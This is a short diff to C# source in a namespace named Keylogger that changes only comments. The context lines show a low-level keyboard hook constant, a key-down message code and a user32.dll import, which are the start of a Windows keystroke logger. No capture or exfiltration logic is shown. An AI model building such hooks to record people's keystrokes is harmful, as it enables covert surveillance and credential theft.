@@ -10,7 +10,7 @@ using System.IO;
 
 namespace Keylogger
 {
-    class Program
+    class Program //main
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
@@ -53,7 +53,6 @@ namespace Keylogger
         }       
 
 
- //Dll's
 //////////////////////////IMPORT DLLS/////////////////////////////////////////////////////////////
 
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
